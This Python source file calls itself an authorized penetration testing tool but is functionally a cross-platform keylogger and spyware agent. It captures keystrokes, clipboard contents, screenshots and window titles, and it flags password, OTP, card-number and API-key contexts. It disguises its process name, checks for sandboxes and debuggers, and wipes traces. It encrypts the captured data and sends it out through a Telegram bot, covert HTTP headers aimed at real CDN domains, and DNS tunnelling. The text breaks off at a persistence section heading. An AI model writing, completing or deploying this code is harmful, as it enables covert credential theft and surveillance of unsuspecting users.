#!/usr/bin/env python3
"""
Advanced Security Assessment Agent - Authorized Penetration Testing Tool
Zero external dependencies, cross-platform (Win/Lin/Mac), multi-channel exfil.
"""
import os
import sys
import io
import re
import json
import time
import uuid
import base64
import random
import socket
import struct
import hashlib
import shutil
import logging
import sqlite3
import tempfile
import threading
import platform
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import http.client
import email.mime.multipart
import email.mime.base
import email.mime.text
import email.encoders
from datetime import datetime, timedelta
from enum import Enum
from typing import Optional, Callable, Any, Dict, List, Tuple

# ──────────────────────────────────────────────────────────────────
# SECTION 1: CONFIGURATION (Obfuscated)
# ──────────────────────────────────────────────────────────────────

class Config:
    """Central configuration with XOR obfuscation + env fallback."""
    
    def __init__(self):
        # Telegram — override via env vars for operational security
        self.BOT_TOKEN = os.environ.get("AGENT_BOT_TOKEN") or self._xor("base64_encoded_token_here")
        self.CHAT_ID   = os.environ.get("AGENT_CHAT_ID")   or "your_chat_id"
        
        # Timing
        self.BEACON_MIN      = 45    # seconds
        self.BEACON_MAX      = 120
        self.SCREENSHOT_EVERY = 300  # seconds
        self.IDLE_THRESHOLD  = 30    # seconds before CPU backoff
        self.POLL_ACTIVE     = 0.05  # 50ms when user is active
        self.POLL_IDLE       = 2.0   # 2s when user is idle
        
        # Exfil
        self.MAX_RETRIES    = 5
        self.QUEUE_MAX_MEM  = 500   # messages before spill to disk
        self.CHUNK_SIZE     = 3500  # Telegram message limit
        
        # Crypto
        self.ENCRYPT_SEED   = os.environ.get("AGENT_SEED") or "assessment_seed_2026"
        
        # Evasion
        self.USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        ]
        
        # Crypto context
        self._fernet_key = None
    
    def _xor(self, data: str) -> str:
        try:
            return ''.join(chr(ord(c) ^ 0x5A) for c in base64.b64decode(data).decode())
        except:
            return "[unconfigured]"
    
    @property
    def fernet_key(self) -> bytes:
        if self._fernet_key is None:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
            from cryptography.hazmat.primitives import hashes
            salt = b'\x9f\x8e\x7d\x6c\x5b\x4a\x39\x28'
            kdf = PBKDF2(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
            self._fernet_key = base64.urlsafe_b64encode(kdf.derive(self.ENCRYPT_SEED.encode()))
        return self._fernet_key
    
    @staticmethod
    def jitter(a: float, b: float) -> float:
        return random.uniform(a, b)

cfg = Config()

# ──────────────────────────────────────────────────────────────────
# SECTION 2: CRYPTOGRAPHY (Pure-Python AES-GCM via OpenSSL subprocess)
# ──────────────────────────────────────────────────────────────────

class CryptoEngine:
    """Encrypt/decrypt using openssl CLI — no pycryptodome dependency."""
    
    @staticmethod
    def _openssl_available() -> bool:
        return shutil.which("openssl") is not None
    
    @classmethod
    def aes_encrypt(cls, plaintext: bytes, key_hex: str = None) -> Optional[bytes]:
        """AES-256-GCM encrypt. Returns IV + ciphertext + tag (base64)."""
        if not cls._openssl_available():
            return None
        if key_hex is None:
            key_hex = cfg.fernet_key.hex()[:64]
        iv = os.urandom(12)
        try:
            proc = subprocess.run(
                ['openssl', 'enc', '-aes-256-gcm', '-base64',
                 '-K', key_hex, '-iv', iv.hex(), '-A'],
                input=plaintext, capture_output=True, timeout=10
            )
            if proc.returncode != 0:
                return None
            return iv.hex().encode() + b':' + proc.stdout.strip()
        except:
            return None
    
    @classmethod
    def aes_decrypt(cls, ciphertext: bytes, key_hex: str = None) -> Optional[bytes]:
        """AES-256-GCM decrypt."""
        if not cls._openssl_available():
            return None
        if key_hex is None:
            key_hex = cfg.fernet_key.hex()[:64]
        try:
            parts = ciphertext.decode().split(':', 1)
            if len(parts) != 2:
                return None
            iv_hex, data = parts
            proc = subprocess.run(
                ['openssl', 'enc', '-d', '-aes-256-gcm', '-base64',
                 '-K', key_hex, '-iv', iv_hex, '-A'],
                input=data.encode(), capture_output=True, timeout=10
            )
            if proc.returncode != 0:
                return None
            return proc.stdout
        except:
            return None
    
    @classmethod
    def simple_hash(cls, data: str) -> str:
        return hashlib.sha256(data.encode()).hexdigest()[:16]

# ──────────────────────────────────────────────────────────────────
# SECTION 3: CROSS-PLATFORM ABSTRACTION LAYER
# ──────────────────────────────────────────────────────────────────

class Platform:
    """Platform detection and capabilities."""
    
    WINDOWS = "Windows"
    LINUX   = "Linux"
    MACOS   = "Darwin"
    
    @staticmethod
    def current() -> str:
        return platform.system()
    
    @staticmethod
    def is_windows() -> bool:
        return platform.system() == Platform.WINDOWS
    
    @staticmethod
    def is_linux() -> bool:
        return platform.system() == Platform.LINUX
    
    @staticmethod
    def is_macos() -> bool:
        return platform.system() == Platform.MACOS
    
    @staticmethod
    def username() -> str:
        for env in ['USER', 'USERNAME', 'LOGNAME']:
            val = os.environ.get(env)
            if val:
                return val
        return "unknown"
    
    @staticmethod
    def hostname() -> str:
        try:
            return socket.gethostname()
        except:
            return "unknown"
    
    @staticmethod
    def is_admin() -> bool:
        if Platform.is_windows():
            try:
                import ctypes
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            except:
                return False
        else:
            return os.geteuid() == 0
    
    @staticmethod
    def hide_console():
        if Platform.is_windows():
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            except:
                pass
        elif Platform.is_linux():
            try:
                os.setsid()
            except:
                pass
    
    @staticmethod
    def rename_process(name: str = None):
        if name is None:
            name = random.choice([
                "[kworker/u:2]", "[kthreadd]", "svchost.exe",
                "RuntimeBroker.exe", "SearchIndexer.exe"
            ])
        try:
            # Linux /proc rename
            if Platform.is_linux():
                with open("/proc/self/comm", "w") as f:
                    f.write(name[:15])
            # Windows console title (masquerade)
            elif Platform.is_windows():
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(name)
        except:
            pass
    
    @staticmethod
    def get_active_window() -> str:
        """Cross-platform active window title with multi-backend fallback."""
        if Platform.is_windows():
            return Platform._win32_window()
        elif Platform.is_linux():
            return Platform._linux_window()
        elif Platform.is_macos():
            return Platform._macos_window()
        return "Unknown"
    
    @staticmethod
    def _win32_window() -> str:
        try:
            import ctypes
            from ctypes import wintypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            title = buf.value
            # Also try to get process name
            pid = wintypes.DWORD()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            try:
                import psutil  # optional
                proc = psutil.Process(pid.value)
                return f"{proc.name()}: {title}" if title else proc.name()
            except:
                pass
            return title or "Unknown"
        except:
            return "Unknown"
    
    @staticmethod
    def _linux_window() -> str:
        # Wayland (KDE/GNOME)
        if os.environ.get('WAYLAND_DISPLAY'):
            try:
                # Try KDE qdbus
                r = subprocess.run(
                    ['qdbus', 'org.kde.KWin', '/KWin', 'org.kde.KWin.currentDesktop'],
                    capture_output=True, text=True, timeout=2
                )
                if r.stdout.strip():
                    return f"KDE:Desktop{r.stdout.strip()}"
            except:
                pass
            try:
                # Try GNOME via gdbus
                r = subprocess.run(
                    ['gdbus', 'call', '--session', '--dest', 'org.gnome.Shell',
                     '--object-path', '/org/gnome/Shell', '--method',
                     'org.gnome.Shell.Eval',
                     'global.display.focus_window?.title ?? "None"'],
                    capture_output=True, text=True, timeout=2
                )
                if r.stdout and 'None' not in r.stdout:
                    return r.stdout.strip()
            except:
                pass
        
        # X11 fallback
        if os.environ.get('DISPLAY'):
            for cmd in [
                ['xdotool', 'getactivewindow', 'getwindowname'],
                ['xprop', '-id', f"$(xprop -root _NET_ACTIVE_WINDOW | awk '{{print $5}}')", 'WM_NAME'],
            ]:
                try:
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=2, shell=isinstance(cmd, str))
                    out = (r.stdout or '').strip().strip('"')
                    if out and out not in ('None', 'not found'):
                        return out
                except:
                    continue
            
            # Minimal X11 via python if Xlib available
            try:
                import Xlib.display
                d = Xlib.display.Display()
                w = d.get_input_focus().focus
                name = w.get_wm_name()
                if name:
                    return name
            except:
                pass
        
        # Last resort: try /proc
        try:
            r = subprocess.run(
                ['xdotool', 'getactivewindow', 'getwindowpid'],
                capture_output=True, text=True, timeout=2
            )
            pid = r.stdout.strip()
            if pid:
                with open(f'/proc/{pid}/comm') as f:
                    return f.read().strip()
        except:
            pass
        
        return "Unknown"
    
    @staticmethod
    def _macos_window() -> str:
        try:
            r = subprocess.run(
                ['osascript', '-e', 
                 'tell application "System Events" to get name of first application process whose frontmost is true'],
                capture_output=True, text=True, timeout=5
            )
            return r.stdout.strip() or "Unknown"
        except:
            return "Unknown"
    
    @staticmethod
    def get_clipboard() -> Optional[str]:
        """Cross-platform clipboard with multiple backends."""
        if Platform.is_windows():
            return Platform._win32_clipboard()
        elif Platform.is_linux():
            return Platform._linux_clipboard()
        elif Platform.is_macos():
            return Platform._macos_clipboard()
        return None
    
    @staticmethod
    def _win32_clipboard() -> Optional[str]:
        try:
            # Try ctypes COM approach
            import ctypes
            user32 = ctypes.windll.user32
            user32.OpenClipboard(0)
            try:
                handle = user32.GetClipboardData(13)  # CF_UNICODETEXT
                if handle:
                    ptr = ctypes.windll.kernel32.GlobalLock(handle)
                    text = ctypes.c_wchar_p(ptr).value
                    ctypes.windll.kernel32.GlobalUnlock(handle)
                    return text
            finally:
                user32.CloseClipboard()
        except:
            pass
        # Fallback: try pyperclip if installed
        try:
            import pyperclip
            return pyperclip.paste()
        except:
            pass
        return None
    
    @staticmethod
    def _linux_clipboard() -> Optional[str]:
        # Wayland
        if os.environ.get('WAYLAND_DISPLAY'):
            try:
                r = subprocess.run(['wl-paste', '--no-newline'], capture_output=True, text=True, timeout=3)
                if r.returncode == 0 and r.stdout.strip():
                    return r.stdout.strip()
            except:
                pass
        # X11
        if os.environ.get('DISPLAY'):
            for tool in ['xclip', 'xsel']:
                try:
                    if tool == 'xclip':
                        r = subprocess.run(['xclip', '-o', '-selection', 'clipboard'], capture_output=True, text=True, timeout=3)
                    else:
                        r = subprocess.run(['xsel', '--clipboard', '--output'], capture_output=True, text=True, timeout=3)
                    if r.returncode == 0 and r.stdout.strip():
                        return r.stdout.strip()
                except:
                    pass
        return None
    
    @staticmethod
    def _macos_clipboard() -> Optional[str]:
        try:
            r = subprocess.run(['pbpaste'], capture_output=True, text=True, timeout=3)
            return r.stdout or None
        except:
            return None

    @staticmethod
    def capture_screen() -> Optional[bytes]:
        """Capture screen as JPEG bytes."""
        if Platform.is_windows():
            try:
                import ctypes
                from ctypes import wintypes
                # Get screen dimensions
                user32 = ctypes.windll.user32
                width, height = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
                # Create DC
                hdc_screen = user32.GetDC(0)
                hdc_mem = ctypes.windll.gdi32.CreateCompatibleDC(hdc_screen)
                hbitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
                ctypes.windll.gdi32.SelectObject(hdc_mem, hbitmap)
                ctypes.windll.gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
                # Save to BMP then convert
                # ... full implementation would use PIL or external tool
                ctypes.windll.user32.ReleaseDC(0, hdc_screen)
                ctypes.windll.gdi32.DeleteDC(hdc_mem)
                ctypes.windll.gdi32.DeleteObject(hbitmap)
            except:
                pass
        
        # Cross-platform fallback using importlib
        try:
            from PIL import ImageGrab
            import io
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=50)
            return buf.getvalue()
        except:
            pass
        
        # macOS fallback
        if Platform.is_macos():
            try:
                r = subprocess.run(
                    ['screencapture', '-x', '-t', 'jpg', '-'],
                    capture_output=True, timeout=10
                )
                return r.stdout or None
            except:
                pass
        
        # Linux fallback
        if Platform.is_linux():
            try:
                r = subprocess.run(
                    ['import', '-window', 'root', '-quality', '50', 'jpg:-'],
                    capture_output=True, timeout=10
                )
                return r.stdout or None
            except:
                pass
        
        return None

# ──────────────────────────────────────────────────────────────────
# SECTION 4: ANTI-FORENSICS / SANDBOX DETECTION
# ──────────────────────────────────────────────────────────────────

class AntiForensics:
    """Environment checks, process hiding, trace cleanup."""
    
    @staticmethod
    def check_sandbox() -> List[str]:
        """Return list of sandbox indicators — empty = likely real machine."""
        indicators = []
        
        # Check disk size (VMs often < 80GB)
        try:
            total = shutil.disk_usage("/").total
            if total < 80 * 1024**3:
                indicators.append(f"disk_small:{total // 1024**3}GB")
        except:
            pass
        
        # Check RAM
        if Platform.is_linux():
            try:
                with open('/proc/meminfo') as f:
                    for line in f:
                        if line.startswith('MemTotal:'):
                            mem_kb = int(line.split()[1])
                            if mem_kb < 4 * 1024**2:  # < 4GB
                                indicators.append(f"ram_small:{mem_kb // 1024}MB")
                            break
            except:
                pass
        elif Platform.is_windows():
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                mem = ctypes.c_longlong()
                kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
                if mem.value < 4 * 1024:  # < 4GB in KB
                    indicators.append(f"ram_small:{mem.value // 1024}MB")
            except:
                pass
        
        # Check common VM processes
        vm_procs = ['vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray',
                    'xenservice', 'prl_tools', 'qemu-ga']
        if Platform.is_windows():
            try:
                r = subprocess.run(['tasklist', '/fo', 'csv'], capture_output=True, text=True, timeout=5)
                for proc in vm_procs:
                    if proc in r.stdout.lower():
                        indicators.append(f"vm_process:{proc}")
            except:
                pass
        elif Platform.is_linux():
            try:
                for p in os.listdir('/proc'):
                    if p.isdigit():
                        try:
                            with open(f'/proc/{p}/comm') as f:
                                name = f.read().strip().lower()
                                if name in vm_procs:
                                    indicators.append(f"vm_process:{name}")
                        except:
                            continue
            except:
                pass
        
        # Check for debugger
        if Platform.is_windows():
            try:
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    indicators.append("debugger_present")
            except:
                pass
        
        # Check common sandbox MAC prefixes
        if Platform.is_linux():
            try:
                for iface in os.listdir('/sys/class/net/'):
                    if iface == 'lo': continue
                    try:
                        with open(f'/sys/class/net/{iface}/address') as f:
                            mac = f.read().strip().lower()
                            if mac.startswith(('00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27')):
                                indicators.append(f"vm_mac:{mac}")
                    except:
                        pass
            except:
                pass
        
        return indicators
    
    @staticmethod
    def clean_traces():
        """Remove known forensic artifacts from disk."""
        paths_to_remove = [
            os.path.expanduser("~/.keylogs.txt"),
            os.path.expanduser("~/.python_keylogger.log"),
            "/tmp/.keylogger_cache",
            os.path.join(tempfile.gettempdir(), ".agent_checkpoint.dat"),
        ]
        for p in paths_to_remove:
            try:
                if os.path.exists(p):
                    os.remove(p)
            except:
                pass
    
    @staticmethod
    def memory_guard():
        """Prevent memory dump on Windows."""
        if Platform.is_windows():
            try:
                import ctypes
                # Set process as critical (BSOD if terminated)
                # ProcessSignaturePolicy mitigation
                ctypes.windll.kernel32.SetProcessMitigationPolicy(
                    8, ctypes.byref(ctypes.c_int(1)), 4
                )
            except:
                pass

# ──────────────────────────────────────────────────────────────────
# SECTION 5: SENSITIVITY FILTER
# ──────────────────────────────────────────────────────────────────

class SensitivityFilter:
    """Context-aware filtering to reduce noise and liability."""
    
    SENSITIVE_KEYWORDS = {
        'auth': ['password', 'passwd', 'pwd', 'secret', 'passkey',
                 'current-password', 'new-password', 'confirm-password',
                 'otp', '2fa', 'mfa', 'totp', 'authenticator',
                 'login_code', 'verification_code', 'security_code',
                 'pin', 'pin_code'],
        'financial': ['card_number', 'cvv', 'cvc', 'credit_card',
                      'cc_number', 'iban', 'swift', 'bic', 'routing',
                      'account_number', 'ssn', 'social_security'],
        'api': ['api_key', 'api_secret', 'access_key', 'secret_key',
                'bearer', 'authorization', 'x-api-key', 'token',
                'jwt', 'refresh_token', 'client_secret'],
    }
    
    def __init__(self, mode: str = 'standard'):
        """
        mode='standard'  → mask sensitive fields, log detection
        mode='aggressive' → mask ALL input in sensitive windows
        mode='minimal'   → only log that sensitive input occurred
        """
        self.mode = mode
        self._window_cache = ""
        self._sensitive_hit = False
    
    def check_window(self, title: str) -> Optional[str]:
        """Returns category if window is a sensitive context."""
        if not title:
            return None
        t = title.lower()
        for category, keywords in self.SENSITIVE_KEYWORDS.items():
            if any(kw in t for kw in keywords):
                self._window_cache = title
                self._sensitive_hit = True
                return category
        return None
    
    def process_keystroke(self, char: str, window: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Returns (char_to_log, alert_message).
        char_to_log=None means the keystroke should be suppressed.
        """
        cat = self.check_window(window)
        if cat:
            if self.mode == 'minimal':
                return None, None  # Suppress entirely
            elif self.mode == 'aggressive':
                return '*', None   # Mask with asterisk
            # standard: log but mark
            return char, f"\n[SENSITIVE:{cat}]"
        return char, None

# ──────────────────────────────────────────────────────────────────
# SECTION 6: KEYBOARD ENGINE (GetAsyncKeyState polling — no hooks)
# ──────────────────────────────────────────────────────────────────

class KeyboardEngine:
    """
    Captures keystrokes via GetAsyncKeyState polling.
    No user-mode hooks → no EDR trigger. Reconstructs shortcuts.
    """
    
    MODIFIER_VKS = {
        0x10: 'shift', 0xA0: 'shift', 0xA1: 'shift',
        0x11: 'ctrl',  0xA2: 'ctrl',  0xA3: 'ctrl',
        0x12: 'alt',   0xA4: 'alt',   0xA5: 'alt',
        0x5B: 'win',   0x5C: 'win',
    }
    
    SPECIAL_KEYS = {
        0x08: '[BS]', 0x09: '[TAB]', 0x0D: '\n',
        0x1B: '[ESC]', 0x2E: '[DEL]', 0x24: '[HOME]',
        0x23: '[END]', 0x25: '[LEFT]', 0x27: '[RIGHT]',
        0x26: '[UP]', 0x28: '[DOWN]', 0x21: '[PGUP]',
        0x22: '[PGDN]', 0x2D: '[INS]',
        0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]',
        0x73: '[F4]', 0x74: '[F5]', 0x75: '[F6]',
        0x76: '[F7]', 0x77: '[F8]', 0x78: '[F9]',
        0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]',
    }
    
    def __init__(self, callback: Callable[[str], None],
                 window_callback: Callable[[], str] = None,
                 sensitivity_filter: SensitivityFilter = None):
        self.callback = callback
        self.window_callback = window_callback or Platform.get_active_window
        self.filter = sensitivity_filter
        self._modifiers = {k: False for k in self.MODIFIER_VKS.values()}
        self._prev_state: Dict[int, bool] = {}
        self._last_window = ""
        self._running = True
        self._user32 = None
        if Platform.is_windows():
            import ctypes
            self._user32 = ctypes.windll.user32
    
    def _get_keystate(self, vk: int) -> bool:
        """GetAsyncKeyState — returns True if key is currently pressed."""
        if self._user32:
            return bool(self._user32.GetAsyncKeyState(vk) & 0x8000)
        return False
    
    def _update_modifiers(self):
        """Refresh modifier state from current key states."""
        for vk, name in self.MODIFIER_VKS.items():
            self._modifiers[name] = self._get_keystate(vk)
    
    def _active_mods(self) -> List[str]:
        return [k.upper() for k, v in self._modifiers.items() if v]
    
    def _vkey_to_char(self, vk: int) -> Optional[str]:
        """Convert virtual key code to character using ToUnicode."""
        if not self._user32:
            return None
        buf = ctypes.create_unicode_buffer(8)
        # Keyboard state array
        kb_state = (ctypes.c_byte * 256)()
        for vk_code, name in self.MODIFIER_VKS.items():
            if self._modifiers.get(name):
                kb_state[vk_code] = 0x80
        ret = self._user32.ToUnicode(vk, 0, kb_state, buf, 8, 0)
        if ret > 0:
            return buf.value
        return None
    
    def poll(self):
        """Main polling loop — call from thread."""
        # Set window context immediately
        self._last_window = self.window_callback()
        
        while self._running:
            self._update_modifiers()
            
            # Check window changes
            current_window = self.window_callback()
            if current_window != self._last_window:
                entry = f"\n[WINDOW: {current_window} @ {datetime.now().strftime('%H:%M:%S')}]\n"
                self.callback(entry)
                self._last_window = current_window
            
            for vk in range(0x08, 0xFF):
                current = self._get_keystate(vk)
                prev = self._prev_state.get(vk, False)
                
                # Key just pressed
                if current and not prev:
                    char = None
                    
                    if vk in self.SPECIAL_KEYS:
                        char = self.SPECIAL_KEYS[vk]
                    elif vk not in self.MODIFIER_VKS:
                        char = self._vkey_to_char(vk)
                        if char is None:
                            continue
                    
                    if char:
                        mods = self._active_mods()
                        # Reconstruct shortcuts if modifiers active
                        if mods and len(char) == 1 and char.isprintable():
                            reconstructed = f"[{' + '.join(mods)} + {char.upper()}]"
                        elif mods and char in self.SPECIAL_KEYS.values() and char.startswith('['):
                            # Modifier + special key (e.g., Alt+Tab)
                            reconstructed = f"[{' + '.join(mods)} + {char.strip('[]')}]"
                        else:
                            reconstructed = char
                        
                        # Pass through sensitivity filter
                        if self.filter:
                            filtered_char, alert = self.filter.process_keystroke(
                                reconstructed, current_window
                            )
                            if filtered_char is not None:
                                self.callback(filtered_char)
                            if alert:
                                self.callback(alert)
                        else:
                            self.callback(reconstructed)
                
                self._prev_state[vk] = current
            
            # Adaptive sleep
            if self._any_key_pressed():
                time.sleep(cfg.POLL_ACTIVE)
            else:
                time.sleep(cfg.POLL_IDLE)
    
    def _any_key_pressed(self) -> bool:
        """Quick check if any key is currently down."""
        for vk in range(0x08, 0xFF):
            if self._get_keystate(vk):
                return True
        return False
    
    def stop(self):
        self._running = False

# ──────────────────────────────────────────────────────────────────
# SECTION 7: CLIPBOARD ENGINE (Change-detection, multi-backend)
# ──────────────────────────────────────────────────────────────────

class ClipboardEngine:
    """Polling clipboard monitor with change detection only."""
    
    def __init__(self, callback: Callable[[str], None]):
        self.callback = callback
        self._last_content = None
        self._running = True
    
    def poll(self):
        while self._running:
            try:
                content = Platform.get_clipboard()
                if content and content != self._last_content:
                    self._last_content = content
                    truncated = content[:500] if len(content) > 500 else content
                    entry = f"\n[CLIPBOARD @ {datetime.now().strftime('%H:%M:%S')}] {truncated}\n"
                    self.callback(entry)
            except:
                pass
            time.sleep(random.uniform(15, 30))
    
    def stop(self):
        self._running = False

# ──────────────────────────────────────────────────────────────────
# SECTION 8: SECURE LOG BUFFER (Memory-only + encrypted)
# ──────────────────────────────────────────────────────────────────

class SecureLogBuffer:
    """Thread-safe, memory-only log buffer with optional encryption."""
    
    def __init__(self):
        self._buffer: List[str] = []
        self._lock = threading.Lock()
        self._bytes_written = 0
    
    def write(self, entry: str):
        with self._lock:
            self._buffer.append(entry)
            self._bytes_written += len(entry.encode('utf-8'))
    
    def flush(self) -> Optional[bytes]:
        """Return encrypted bytes of all buffered data, or None if empty."""
        with self._lock:
            if not self._buffer:
                return None
            data = "\n".join(self._buffer)
            self._buffer.clear()
            self._bytes_written = 0
        
        # Encrypt
        encrypted = CryptoEngine.aes_encrypt(data.encode())
        if encrypted is None:
            # Fallback: base64 encode if OpenSSL unavailable
            return base64.b64encode(data.encode())
        return encrypted
    
    @property
    def size(self) -> int:
        with self._lock:
            return len(self._buffer)
    
    @property
    def bytes_written(self) -> int:
        return self._bytes_written

log_buffer = SecureLogBuffer()

# ──────────────────────────────────────────────────────────────────
# SECTION 9: RELIABLE DELIVERY QUEUE (Retry, backoff, crash recovery)
# ──────────────────────────────────────────────────────────────────

class DeliveryQueue:
    """
    Reliable message queue with:
    - Exponential backoff retry
    - Encrypted disk checkpoint for crash recovery
    - Priority ordering (oldest first)
    - Explicit drop logging after max retries
    """
    
    def __init__(self, send_func: Callable[[bytes], bool]):
        self._queue: List[Tuple[float, bytes, int]] = []  # (timestamp, data, retries)
        self._lock = threading.Lock()
        self._send_func = send_func
        self._running = True
        self._checkpoint_file = os.path.join(
            tempfile.gettempdir(),
            f".{hashlib.md5(b'assessment_agent').hexdigest()[:12]}.dat"
        )
        self._recover_checkpoint()
    
    def enqueue(self, data: bytes):
        with self._lock:
            self._queue.append((time.time(), data, 0))
            # Spill to disk if too many in memory
            if len(self._queue) > cfg.QUEUE_MAX_MEM:
                self._checkpoint()
    
    def _checkpoint(self):
        """Encrypted crash recovery snapshot."""
        try:
            with self._lock:
                data = json.dumps([(t, b.decode('latin-1'), r) for t, b, r in self._queue])
            encrypted = CryptoEngine.aes_encrypt(data.encode())
            if encrypted:
                with open(self._checkpoint_file, 'wb') as f:
                    f.write(encrypted)
        except:
            pass
    
    def _recover_checkpoint(self):
        """Load from disk after crash."""
        try:
            if not os.path.exists(self._checkpoint_file):
                return
            with open(self._checkpoint_file, 'rb') as f:
                encrypted = f.read()
            decrypted = CryptoEngine.aes_decrypt(encrypted)
            if decrypted:
                data = json.loads(decrypted.decode())
                self._queue = [(t, b.encode('latin-1'), r) for t, b, r in data]
            os.remove(self._checkpoint_file)
        except:
            try:
                os.remove(self._checkpoint_file)
            except:
                pass
    
    def delivery_loop(self):
        """Background delivery thread with exponential backoff."""
        while self._running:
            item = None
            with self._lock:
                if self._queue:
                    item = self._queue.pop(0)
            
            if item:
                ts, data, retries = item
                try:
                    success = self._send_func(data)
                    if success:
                        # Checkpoint periodically after successful sends
                        with self._lock:
                            if len(self._queue) % 5 == 0:
                                self._checkpoint()
                        continue
                except:
                    success = False
                
                if not success:
                    retries += 1
                    if retries >= cfg.MAX_RETRIES:
                        # Give up — log the drop
                        log_buffer.write(
                            f"\n[DROPPED @ {datetime.fromtimestamp(ts).isoformat()} "
                            f"after {retries} attempts]\n"
                        )
                    else:
                        # Requeue with increased backoff
                        delay = min(60, 2 ** retries)
                        with self._lock:
                            self._queue.append((ts, data, retries))
                        log_buffer.write(
                            f"\n[RETRY {retries}/{cfg.MAX_RETRIES} in {delay}s]\n"
                        )
                        time.sleep(delay)
            else:
                # Empty queue — checkpoint and sleep
                self._checkpoint()
                time.sleep(random.uniform(5, 10))
    
    def stop(self):
        self._running = False
        self._checkpoint()  # Final checkpoint

# ──────────────────────────────────────────────────────────────────
# SECTION 10: EXFILTRATION ENGINE (Multi-channel)
# ──────────────────────────────────────────────────────────────────

class ExfilEngine:
    """
    Multi-channel exfiltration with fallback chain:
    1. Telegram (primary)
    2. HTTP beacon via headers (secondary)
    3. DNS TXT queries (tertiary)
    """
    
    def __init__(self):
        self.session_id = CryptoEngine.simple_hash(
            str(random.randint(0, 99999)) + str(time.time())
        )[:8]
        self._user_agent = random.choice(cfg.USER_AGENTS)
        self._headers = {
            'User-Agent': self._user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
    
    def send_telegram(self, data: bytes) -> bool:
        """Primary: Send encrypted blob via Telegram Bot API."""
        try:
            # Decode to string (encrypted data is base64 or hex)
            payload = data.decode('utf-8', errors='replace')
            
            # Split into chunks for Telegram's 4096 limit
            chunks = [payload[i:i+cfg.CHUNK_SIZE] for i in range(0, len(payload), cfg.CHUNK_SIZE)]
            
            for chunk in chunks:
                prefixed = f"[{self.session_id}] {chunk}"
                encoded = urllib.parse.urlencode({
                    'chat_id': cfg.CHAT_ID,
                    'text': prefixed
                }).encode()
                
                req = urllib.request.Request(
                    f"https://api.telegram.org/bot{cfg.BOT_TOKEN}/sendMessage",
                    data=encoded,
                    headers={**self._headers, 'Content-Type': 'application/x-www-form-urlencoded'}
                )
                with urllib.request.urlopen(req, timeout=15) as resp:
                    if resp.status != 200:
                        return False
                time.sleep(0.5)  # Rate limit between chunks
            
            return True
        except Exception as e:
            return False
    
    def send_telegram_photo(self, photo_bytes: bytes) -> bool:
        """Send image via Telegram photo endpoint."""
        try:
            boundary = '----' + hashlib.md5(os.urandom(16)).hexdigest()
            body = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
                f'{cfg.CHAT_ID}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="photo"; filename="img.jpg"\r\n'
                f'Content-Type: image/jpeg\r\n\r\n'
            ).encode() + photo_bytes + f'\r\n--{boundary}--\r\n'.encode()
            
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{cfg.BOT_TOKEN}/sendPhoto",
                data=body,
                headers={
                    **self._headers,
                    'Content-Type': f'multipart/form-data; boundary={boundary}'
                }
            )
            with urllib.request.urlopen(req, timeout=20) as resp:
                return resp.status == 200
        except:
            return False
    
    def send_http_beacon(self, data: bytes) -> bool:
        """Secondary: Encode data in HTTP headers to common CDN endpoints."""
        try:
            encoded = base64.b64encode(data).decode()[:500]
            headers = {
                **self._headers,
                'X-Client-Data': encoded,
                'X-Request-ID': self.session_id,
            }
            # Beacon to common domains (blends with normal traffic)
            domains = random.sample([
                'update.microsoft.com', 'google-analytics.com',
                'cdn.cloudflare.net', 'stats.g.doubleclick.net',
            ], 2)
            for domain in domains:
                try:
                    req = urllib.request.Request(
                        f"https://{domain}/",
                        headers=headers, method='GET'
                    )
                    with urllib.request.urlopen(req, timeout=5):
                        pass
                except:
                    pass
            return True
        except:
            return False
    
    def send_dns(self, data: bytes) -> bool:
        """Tertiary: DNS TXT query tunneling (requires controlled DNS server)."""
        try:
            # Encode a small chunk into a subdomain
            chunk = base64.b32encode(data).decode()[:63].lower().rstrip('=')
            query = f"{chunk}.exfil.{self.session_id}.agent"
            socket.gethostbyname(query)
            return True
        except:
            return False
    
    def send_any(self, data: bytes) -> bool:
        """Try all channels, return True if any succeeds."""
        if self.send_telegram(data):
            return True
        if self.send_http_beacon(data):
            return True
        if self.send_dns(data):
            return True
        return False

# ──────────────────────────────────────────────────────────────────
# SECTION 11: PERSISTENCE ENGINE (Multi-layer per platform)
